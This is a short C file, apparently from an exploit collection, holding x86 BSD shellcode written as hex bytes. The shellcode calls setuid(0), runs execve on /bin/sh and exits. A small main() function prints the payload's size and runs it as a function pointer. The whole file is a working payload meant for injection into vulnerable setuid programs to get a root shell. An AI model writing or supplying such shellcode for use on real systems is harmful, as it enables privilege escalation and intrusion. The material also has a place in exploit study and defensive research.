/*
***********************************************************
* Author: posidron (www.tripbit.org)
*
* Description: xBSD setuid(); sehllcode for x86 arch.
*              setuid(0); execve /bin/sh; exit(0);
***********************************************************
*/

#include <stdio.h>

char shellcode[]= "\x31\xdb\xb0\x17\xcd\x80" // setuid(0)
                  "\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e" // execv /bin/sh
                  "\x89\xe3\x50\x54\x53\x50\xb0\x3b\xcd\x80"
                  "\x31\xdb\xb0\x01\xcd\x80"; // exit(0)

int main(int argc, char **argv)
{
	void(*tsrg) (void);
	tsrg = (void*)shellcode;
	fprintf(stdout, "Size: %d bytes.\n", sizeof(shellcode));
	tsrg();
	return 0;
}
